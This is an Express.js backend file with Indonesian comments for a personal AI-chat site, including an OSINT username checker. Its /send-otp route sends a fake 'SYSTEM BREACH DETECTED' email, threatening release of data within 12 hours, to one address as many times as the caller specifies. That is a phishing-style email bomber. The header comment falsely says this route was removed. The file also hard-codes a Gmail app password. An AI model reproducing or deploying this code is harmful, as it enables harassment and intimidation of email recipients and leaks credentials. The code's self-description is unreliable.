/* =========================================================
   index.js — FannyFa Backend (Express, siap Vercel)

   CATATAN PENTING soal Vercel:
   Serverless function itu STATELESS — filesystem-nya ephemeral
   (/tmp doang yang writable, dan itu pun bisa ke-reset kapan aja
   antar invocation/container beda). Artinya:
     - API key yang disimpen lewat Settings (data/keys.json) BISA
       ilang sewaktu-waktu di production Vercel.
     - Riwayat sesi chat (data/sessions/*.json) juga sama, gak
       dijamin persisten.
   Buat pemakaian ringan/personal ini masih oke jalan, tapi kalau
   mau beneran awet, ke depannya pindahin ke database beneran
   (Vercel KV / Supabase / MongoDB Atlas, dll). Untuk sekarang API
   key juga bisa diisi lewat Environment Variables di dashboard
   Vercel (GEMINI_API_KEY, GROQ_API_KEY, OPENAI_API_KEY,
   DEEPSEEK_API_KEY, QWEN_API_KEY) — itu cara paling stabil.

   CATATAN: endpoint /send-otp & /verify-otp yang lama SENGAJA
   dihapus dari file ini karena isinya email "SYSTEM BREACH
   DETECTED" bernada ancaman yang dikirim berulang kali ke satu
   alamat email (pola phishing + email bombing). Kalau butuh OTP
   verifikasi yang beneran (1x kirim, isi netral, ada rate-limit),
   bisa diminta terpisah.
========================================================= */
const nodemailer = require('nodemailer');
const express = require('express');
const cors = require('cors');
const cookieParser = require('cookie-parser');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();
const chatRoutes = require("./routes/chat.routes");
const sessionRoutes = require("./routes/session.routes");
const settingsRoutes = require("./routes/settings.routes");
app.use(cookieParser());
app.use(express.static(path.join(__dirname)));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));
app.use(cors());
app.use(express.static(path.join(__dirname, 'media', 'public')));

/* =========================================================
   DATA STORAGE
   API key: dikelola di config/settingai.js (modular, terpisah)
   Sesi chat: tetap fs-based di sini (lihat catatan Vercel di atas)
========================================================= */

const settingai = require('./config/settingai');
const PROVIDERS = settingai.PROVIDERS;

const dataDir = process.env.VERCEL ? '/tmp/ff-ai-data' : path.join(__dirname, 'data');
const sessionsDir = path.join(dataDir, 'sessions');

function ensureDataDirs() {
  if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
  if (!fs.existsSync(sessionsDir)) fs.mkdirSync(sessionsDir, { recursive: true });
}

function getApiKey(provider) {
  return settingai.getApiKey(provider);
}

function getKeyStatus() {
  return settingai.getKeyStatus();
}

function sessionPath(id) {
  return path.join(sessionsDir, `${id}.json`);
}

function newId(prefix) {
  return `${prefix}_${crypto.randomBytes(8).toString('hex')}`;
}

function createSession(deviceId, firstText) {
  ensureDataDirs();
  const session = {
    id: newId('sess'),
    deviceId,
    title: (firstText || 'Percakapan baru').slice(0, 40),
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
    messages: []
  };
  fs.writeFileSync(sessionPath(session.id), JSON.stringify(session, null, 2));
  return session;
}

function getSession(id) {
  ensureDataDirs();
  const p = sessionPath(id);
  if (!fs.existsSync(p)) return null;
  try {
    return JSON.parse(fs.readFileSync(p, 'utf-8'));
  } catch (e) {
    return null;
  }
}

function saveSession(session) {
  ensureDataDirs();
  session.updatedAt = new Date().toISOString();
  fs.writeFileSync(sessionPath(session.id), JSON.stringify(session, null, 2));
}

function appendMessage(sessionId, message) {
  const session = getSession(sessionId);
  if (!session) return null;
  const withId = { id: newId('msg'), ...message };
  session.messages.push(withId);
  saveSession(session);
  return withId;
}

function listSessionsByDevice(deviceId) {
  ensureDataDirs();
  const files = fs.readdirSync(sessionsDir).filter((f) => f.endsWith('.json'));
  const sessions = [];
  files.forEach((f) => {
    try {
      const data = JSON.parse(fs.readFileSync(path.join(sessionsDir, f), 'utf-8'));
      if (data.deviceId === deviceId) {
        sessions.push({ id: data.id, title: data.title, updatedAt: data.updatedAt });
      }
    } catch (e) {}
  });
  return sessions.sort((a, b) => new Date(b.updatedAt) - new Date(a.updatedAt));
}

/* =========================================================
   ATTACHMENT HELPERS
   Frontend kirim attachments sebagai base64 lewat JSON (bukan
   multipart) — lebih kompatibel sama Vercel serverless function.
========================================================= */

const TEXT_LIKE_EXT = ['.txt', '.js', '.py', '.json', '.html', '.css', '.md', '.csv', '.log'];

function decodeMaybeDataUrl(raw) {
  const match = /^data:(.+);base64,(.*)$/s.exec(raw || '');
  if (match) return { mime: match[1], base64: match[2] };
  return { mime: null, base64: raw || '' };
}

function isTextLike(name, mime) {
  if (mime && mime.startsWith('text/')) return true;
  const lower = (name || '').toLowerCase();
  return TEXT_LIKE_EXT.some((ext) => lower.endsWith(ext));
}

/** Ubah 1 pesan user + attachments jadi { text, images[] } yang dipakai provider */
function buildUserContent(message, attachments) {
  const images = [];
  let extraText = '';

  (attachments || []).forEach((att) => {
    const { mime, base64 } = decodeMaybeDataUrl(att.dataBase64);
    const effectiveMime = mime || att.type || '';

    if (effectiveMime.startsWith('image/')) {
      images.push({ mime: effectiveMime, base64, name: att.name });
    } else if (isTextLike(att.name, effectiveMime)) {
      try {
        const text = Buffer.from(base64, 'base64').toString('utf-8');
        extraText += `\n\n--- File: ${att.name} ---\n${text.slice(0, 6000)}\n--- akhir file ---`;
      } catch (e) {
        extraText += `\n\n[Lampiran: ${att.name} gagal dibaca]`;
      }
    } else {
      extraText += `\n\n[Lampiran: ${att.name}${effectiveMime ? ' (' + effectiveMime + ')' : ''} — jenis file ini belum bisa dibaca langsung, cuma nama filenya yang diketahui AI]`;
    }
  });

  return { text: (message || '') + extraText, images };
}

/* =========================================================
   PROVIDER CALLERS
========================================================= */

async function geminiChat(apiKey, model, history, systemPrompt) {
  if (!apiKey) throw new Error('API key Gemini belum di-set. Buka Settings.');

  const url = `https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${apiKey}`;

  const contents = history.map((h) => {
    const parts = [];
    if (h.text) parts.push({ text: h.text });
    (h.images || []).forEach((img) => {
      parts.push({ inlineData: { mimeType: img.mime, data: img.base64 } });
    });
    return { role: h.role === 'assistant' ? 'model' : 'user', parts };
  });

  const body = { contents };
  if (systemPrompt) {
    body.systemInstruction = { parts: [{ text: systemPrompt }] };
  }

  const res = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  });

  if (!res.ok) {
    const t = await res.text().catch(() => '');
    throw new Error(`Gemini error (${res.status}): ${t.slice(0, 300)}`);
  }

  const data = await res.json();
  const reply = data?.candidates?.[0]?.content?.parts?.map((p) => p.text).filter(Boolean).join('\n');
  if (!reply) throw new Error('Gemini tidak mengembalikan jawaban.');
  return reply;
}

const OAI_ENDPOINTS = {
  openai: 'https://api.openai.com/v1/chat/completions',
  groq: 'https://api.groq.com/openai/v1/chat/completions',
  deepseek: 'https://api.deepseek.com/chat/completions',
  qwen: 'https://dashscope.aliyuncs.com/compatible-mode/v1/chat/completions'
};

async function openAiCompatibleChat(provider, apiKey, model, history, systemPrompt) {
  const endpoint = OAI_ENDPOINTS[provider];
  if (!endpoint) throw new Error(`Provider tidak dikenal: ${provider}`);
  if (!apiKey) throw new Error(`API key untuk ${provider} belum di-set. Buka Settings.`);

  const messages = [];
  if (systemPrompt) messages.push({ role: 'system', content: systemPrompt });

  history.forEach((h) => {
    if (h.images && h.images.length) {
      const content = [];
      if (h.text) content.push({ type: 'text', text: h.text });
      h.images.forEach((img) => {
        content.push({ type: 'image_url', image_url: { url: `data:${img.mime};base64,${img.base64}` } });
      });
      messages.push({ role: h.role, content });
    } else {
      messages.push({ role: h.role, content: h.text });
    }
  });

  const res = await fetch(endpoint, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${apiKey}` },
    body: JSON.stringify({ model, messages, temperature: 0.7 })
  });

  if (!res.ok) {
    const t = await res.text().catch(() => '');
    throw new Error(`${provider} error (${res.status}): ${t.slice(0, 300)}`);
  }

  const data = await res.json();
  const reply = data?.choices?.[0]?.message?.content;
  if (!reply) throw new Error(`${provider} tidak mengembalikan jawaban.`);
  return reply;
}

async function callProvider(provider, model, history, systemPrompt) {
  const apiKey = getApiKey(provider);
  if (provider === 'gemini') return geminiChat(apiKey, model, history, systemPrompt);
  if (['groq', 'openai', 'deepseek', 'qwen'].includes(provider)) {
    return openAiCompatibleChat(provider, apiKey, model, history, systemPrompt);
  }
  throw new Error(`Provider "${provider}" tidak didukung.`);
}
const otpStore = new Map();

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'fannyfadeveloper@gmail.com', // ganti
    pass: 'hywx wwff olsz howu'         // App Password Gmail
  }
});
app.use(express.static(path.join(__dirname, "media", "public")));

// API routes
app.use("/api", chatRoutes);
app.use("/api", sessionRoutes);
app.use("/api", settingsRoutes);
app.get("/ai", (req, res) => {
  res.sendFile(path.join(__dirname, "media", "public", "ai-chat.html"));
});

app.get('/tools/sendotp', (req, res) => {
  res.sendFile(path.join(__dirname,"media", "sendotp.html"));
});
app.get('/tools/osint', (req, res) => {
  res.sendFile(path.join(__dirname,"media", "osint.html"));
});
app.post('/send-otp', async (req, res) => {
  const { email, number } = req.body;

  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!email || !emailRegex.test(email)) {
    return res.json({ success: false, message: 'Email tidak valid' });
  }

  if (!number || !/^[0-9]+$/.test(number)) {
    return res.json({ success: false, message: 'Nomor tidak valid' });
  }

  const otp = crypto.randomInt(100000, 999999).toString();
  const expiredAt = Date.now() + 5 * 60 * 1000;

  otpStore.set(email, { otp, expiredAt, number });

  try {
    for (let i = 0; i < number; i++) {
      await transporter.sendMail({
        from: '"Verifikasi OTP" <emailkamu@gmail.com>',
        to: email,
        subject: 'Verification Code // Secure Channel',
        html: `
<div style="margin:0;padding:0;background:#020617;font-family:Segoe UI,Arial,sans-serif;">
  <div style="max-width:600px;margin:40px auto;background:#020617;border:1px solid #0f172a;border-radius:12px;overflow:hidden;box-shadow:0 0 40px rgba(239,68,68,0.15);">

    <!-- Header -->
    <div style="background:linear-gradient(90deg,#7f1d1d,#dc2626);padding:20px;text-align:center;">
      <h1 style="margin:0;color:#fff;font-size:20px;letter-spacing:1px;">
        SYSTEM BREACH DETECTED
      </h1>
    </div>

    <!-- Body -->
    <div style="padding:25px;color:#e2e8f0;line-height:1.6;">

      <p>Dear User,</p>

      <p>
        Your account has been flagged by our monitoring system after multiple intrusion attempts were successfully executed.
      </p>

      <p style="color:#f87171;">
        <b>Security layers compromised. Data integrity is no longer guaranteed.</b>
      </p>

      <div style="background:#020617;border:1px solid #1e293b;padding:15px;border-radius:8px;margin:20px 0;">
        <p style="margin:0 0 10px 0;">Access obtained to:</p>
        <ul style="margin:0;padding-left:18px;">
          <li>Authentication credentials</li>
          <li>Session tokens</li>
          <li>Linked external services</li>
        </ul>
      </div>

      <p>
        Do not ignore this message. Our system does not generate false alerts.
      </p>

      <p>
        Failure to act within <b style="color:#ef4444;">12 hours</b> will trigger automated distribution of collected data.
      </p>

      <!-- BUTTON -->
      <div style="text-align:center;margin:30px 0;">
        <a href="https://example.com/verify"
           style="background:#dc2626;color:#fff;padding:14px 28px;
           text-decoration:none;border-radius:8px;
           display:inline-block;font-weight:bold;box-shadow:0 0 15px rgba(239,68,68,0.5);">
          LANJUTKAN SEKARANG
        </a>
      </div>

      <div style="background:#7f1d1d20;border:1px solid #7f1d1d;padding:15px;border-radius:8px;margin:20px 0;color:#fca5a5;">
        Immediate action required.
      </div>

      <p>Recommended actions:</p>

      <ol style="padding-left:18px;">
        <li>Reset all passwords</li>
        <li>Enable multi-factor authentication</li>
        <li>Review account activity logs</li>
      </ol>

      <p style="color:#ef4444;">
        This is your final notification.
      </p>

    </div>

    <!-- Footer -->
    <div style="padding:15px;text-align:center;border-top:1px solid #0f172a;color:#64748b;font-size:12px;">
      Automated Security Node<br>
      Encrypted Monitoring System v3.4
    </div>

  </div>
</div>
        `
      });
      console.log(` [${i + 1}/${number}] OTP terkirim ke ${email}`);
    }

    res.json({ success: true, message: `OTP berhasil dikirim ${number}x` });

  } catch (err) {
    console.error('Gagal kirim email:', err.message);
    res.json({ success: false, message: 'Gagal mengirim email' });
  }
});
app.post('/verify-otp', (req, res) => {
  const { email, otp } = req.body;

  const data = otpStore.get(email);

  if (!data) {
    return res.json({ success: false, message: 'OTP tidak ditemukan' });
  }

  if (Date.now() > data.expiredAt) {
    otpStore.delete(email);
    return res.json({ success: false, message: 'OTP sudah kadaluarsa' });
  }

  if (data.otp !== otp) {
    return res.json({ success: false, message: 'OTP salah' });
  }

  otpStore.delete(email);
  res.json({ success: true, message: 'Verifikasi berhasil!' });
});
/* =========================================================
   API ROUTES — AI CHAT
========================================================= */

/**
 * POST /api/chat
 * body JSON: {
 *   deviceId, sessionId, provider, model, message, systemPrompt,
 *   attachments: [{ name, type, dataBase64 }]
 * }
 */
app.post('/api/chat', async (req, res) => {
  try {
    const { deviceId, provider, model, message, systemPrompt, attachments } = req.body;
    let { sessionId } = req.body;

    if (!deviceId || !provider || !model) {
      return res.status(400).json({ error: 'deviceId, provider, dan model wajib diisi.' });
    }

    let session = sessionId ? getSession(sessionId) : null;
    if (!session) {
      session = createSession(deviceId, message);
      sessionId = session.id;
    }

    const attMeta = (attachments || []).map((a) => ({ name: a.name, type: a.type }));

    const userMessage = appendMessage(sessionId, {
      role: 'user',
      content: message || '',
      attachments: attMeta,
      model
    });

    const built = buildUserContent(message, attachments);

    const historyForModel = session.messages
      .concat([userMessage])
      .slice(-20)
      .map((m) => {
        if (m.id === userMessage.id) {
          return { role: 'user', text: built.text, images: built.images };
        }
        return { role: m.role === 'ai' ? 'assistant' : m.role, text: m.content, images: [] };
      });

    let replyText;
    try {
      replyText = await callProvider(provider, model, historyForModel, systemPrompt);
    } catch (providerErr) {
      return res.status(502).json({ error: providerErr.message });
    }

    const aiMessage = appendMessage(sessionId, { role: 'ai', content: replyText, model });

    return res.json({ sessionId, messageId: aiMessage.id, reply: replyText });

  } catch (err) {
    console.error(err);
    return res.status(500).json({ error: 'Terjadi kesalahan internal server.' });
  }
});

/* =========================================================
   API ROUTES — SESSIONS
========================================================= */
/* =========================================================
   OSINT AUTO-CHECK — tambahin blok ini ke index.js (setelah
   route /api/settings/keys atau di mana aja sebelum module.exports)

   Cara kerja:
   - Browser gak bisa fetch cross-origin ke instagram.com/tiktok.com/
     dst (kena CORS), makanya pengecekan HARUS lewat backend ini.
   - Server ngirim request GET ke URL profil tiap platform, terus
     nyimpulin status dari kode HTTP + potongan teks di halaman.

   Batasan (WAJIB dibaca):
   - Cuma platform yang punya pola URL profil langsung yang bisa
     dicek (instagram, tiktok, github, telegram, threads, tumblr,
     snapchat, x, youtube). Yang berbasis hasil pencarian (facebook,
     linkedin, reddit, pinterest, vk) TIDAK bisa dicek otomatis.
   - Beberapa platform (terutama Instagram/TikTok) suka ngeblokir
     request otomatis atau balikin 200 meski akun gak ada -> hasil
     bisa "uncertain", jangan dianggap 100% akurat.
   - Ada limit 10 platform per request & timeout 7 detik per cek,
     biar gak nge-spam server platform lain / kena rate-limit.
   - JANGAN dipakai buat cek banyak username sekaligus terus-terusan
     (bisa bikin IP server lu di-block sama platform yang dicek).
========================================================= */

const OSINT_CHECKS = {
  instagram: {
    url: (u) => `https://www.instagram.com/${u}/`,
    foundIf: (status, body) => status === 200 && !/Sorry, this page/i.test(body),
    notFoundIf: (status, body) => status === 404 || /Sorry, this page/i.test(body)
  },
  tiktok: {
    url: (u) => `https://www.tiktok.com/@${u}`,
    foundIf: (status, body) => status === 200 && !/Couldn.?t find this account/i.test(body),
    notFoundIf: (status, body) => /Couldn.?t find this account/i.test(body) || status === 404
  },
  github: {
    url: (u) => `https://github.com/${u}`,
    foundIf: (status) => status === 200,
    notFoundIf: (status) => status === 404
  },
  telegram: {
    url: (u) => `https://t.me/${u}`,
    foundIf: (status, body) => status === 200 && /tgme_page_title/i.test(body),
    notFoundIf: (status, body) => /tgme_icon_dead|If you have Telegram, you can view/i.test(body) === false && status !== 200
  },
  threads: {
    url: (u) => `https://www.threads.net/@${u}`,
    foundIf: (status) => status === 200,
    notFoundIf: (status) => status === 404
  },
  tumblr: {
    url: (u) => `https://${u}.tumblr.com`,
    foundIf: (status) => status === 200,
    notFoundIf: (status) => status === 404
  },
  snapchat: {
    url: (u) => `https://www.snapchat.com/add/${u}`,
    foundIf: (status, body) => status === 200 && !/Content Not Found/i.test(body),
    notFoundIf: (status, body) => /Content Not Found/i.test(body)
  },
  x: {
    url: (u) => `https://twitter.com/${u}`,
    foundIf: (status) => status === 200,
    notFoundIf: (status) => status === 404
  },
  youtube: {
    url: (u) => `https://www.youtube.com/@${u}`,
    foundIf: (status) => status === 200,
    notFoundIf: (status) => status === 404
  }
};

async function checkOnePlatform(key, username) {
  const cfg = OSINT_CHECKS[key];
  if (!cfg) return { key, status: 'unsupported' };

  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 7000);

  try {
    const r = await fetch(cfg.url(username), {
      method: 'GET',
      redirect: 'follow',
      signal: controller.signal,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36'
      }
    });
    const body = await r.text().catch(() => '');

    if (cfg.notFoundIf(r.status, body)) return { key, status: 'not_found' };
    if (cfg.foundIf(r.status, body)) return { key, status: 'found' };
    return { key, status: 'uncertain', httpStatus: r.status };
  } catch (err) {
    return { key, status: 'uncertain', error: 'timeout_or_blocked' };
  } finally {
    clearTimeout(timeout);
  }
}

/**
 * POST /api/osint/check
 * body: { username: "fannyfa", platforms: ["instagram","github",...] }
 */
app.post('/api/osint/check', async (req, res) => {
  const { username, platforms } = req.body;

  if (!username || typeof username !== 'string') {
    return res.status(400).json({ error: 'username wajib diisi.' });
  }
  if (!Array.isArray(platforms) || platforms.length === 0) {
    return res.status(400).json({ error: 'platforms wajib berupa array dan tidak boleh kosong.' });
  }

  // batasin max 10 per request biar gak dipakai nge-spam
  const limited = platforms.slice(0, 10);
  const cleanUsername = username.trim().replace(/\s+/g, '');

  const results = await Promise.all(
    limited.map((p) => checkOnePlatform(p, cleanUsername))
  );

  res.json({ username: cleanUsername, results });
});

app.get('/api/sessions/:deviceId', (req, res) => {
  res.json({ sessions: listSessionsByDevice(req.params.deviceId) });
});

app.get('/api/session/:sessionId', (req, res) => {
  const session = getSession(req.params.sessionId);
  if (!session) return res.status(404).json({ error: 'Sesi tidak ditemukan.' });
  res.json({ messages: session.messages, title: session.title });
});

app.delete('/api/session/:sessionId', (req, res) => {
  const session = getSession(req.params.sessionId);
  if (!session) return res.status(404).json({ error: 'Sesi tidak ditemukan.' });
  const p = sessionPath(req.params.sessionId);
  if (fs.existsSync(p)) fs.unlinkSync(p);
  res.json({ success: true });
});

app.delete('/api/session/:sessionId/message/:messageId', (req, res) => {
  const session = getSession(req.params.sessionId);
  if (!session) return res.status(404).json({ error: 'Sesi tidak ditemukan.' });
  session.messages = session.messages.filter((m) => m.id !== req.params.messageId);
  saveSession(session);
  res.json({ success: true });
});

/* =========================================================
   API ROUTES — SETTINGS (API KEY)
========================================================= */

app.get('/api/settings/keys', (req, res) => {
  res.json(getKeyStatus());
});

app.post('/api/settings/keys', (req, res) => {
  const { keys } = req.body;
  if (!keys || typeof keys !== 'object') {
    return res.status(400).json({ error: "Body 'keys' wajib berupa object." });
  }
  const allowed = {};
  PROVIDERS.forEach((p) => { if (keys[p]) allowed[p] = String(keys[p]).trim(); });
  settingai.setApiKeys(allowed);
  res.json({ success: true, status: getKeyStatus() });
});

/* =========================================================
   STATIC PAGE ROUTES
========================================================= */

app.get('/ai', (req, res) => {
  res.sendFile(path.join(__dirname, 'media', 'public', 'ai-chat.html'));
});

app.get('/tools/sendotp', (req, res) => {
  res.sendFile(path.join(__dirname, 'media', 'sendotp.html'));
});

app.get('/tools/base64', (req, res) => {
  res.sendFile(path.join(__dirname, 'media', 'base64.html'));
});

app.get('/tools', (req, res) => {
  res.sendFile(path.join(__dirname, 'media', 'tools.html'));
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'media', 'index.html'));
});

/* =========================================================
   EXPORT (Vercel) / LISTEN (lokal)
========================================================= */

module.exports = app;

if (!process.env.VERCEL) {
  const PORT = process.env.PORT || 3000;
  app.listen(PORT, () => {
    console.log(`Terhubung Ke Server, port ${PORT}`);
  }).on('error', (err) => {
    console.log('gagal:', err.message);
  });
}
